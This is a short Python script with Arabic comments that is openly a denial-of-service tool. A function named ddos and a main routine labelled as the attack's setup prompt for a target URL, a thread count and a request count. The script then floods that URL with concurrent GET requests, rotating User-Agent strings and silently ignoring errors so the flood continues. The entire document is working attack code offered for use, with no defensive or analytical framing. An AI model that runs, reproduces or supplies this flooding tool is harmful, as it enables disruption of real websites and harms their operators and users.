import requests
import threading
import random
from queue import Queue

# قائمة رؤوس المستخدم (User-Agents)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    # أضف المزيد من وكلاء المستخدم هنا
]

urls = Queue()

def ddos():
    """
    تنفيذ الطلبات على الهدف بصمت تام دون استخدام الوكلاء.
    """
    while not urls.empty():
        url = urls.get()
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            requests.get(url, headers=headers, timeout=5)  # إرسال الطلب
        except requests.exceptions.RequestException:
            pass  # تجاهل الأخطاء لضمان الاستمرارية
        urls.task_done()

def main():
    """
    الإعداد الرئيسي للهجوم.
    """
    target = input("Enter the target URL: ").strip()
    thread_count = int(input("Enter the number of threads: "))
    request_count = int(input("Enter the total number of requests: "))

    if thread_count <= 0 or request_count <= 0:
        return  # إنهاء البرنامج إذا كانت القيم غير صحيحة

    # إضافة الهدف إلى قائمة الطلبات
    for _ in range(request_count):
        urls.put(target)

    threads = []

    # إنشاء وتشغيل الخيوط
    for _ in range(thread_count):
        thread = threading.Thread(target=ddos)
        threads.append(thread)
        thread.start()

    # انتظار انتهاء جميع الخيوط
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
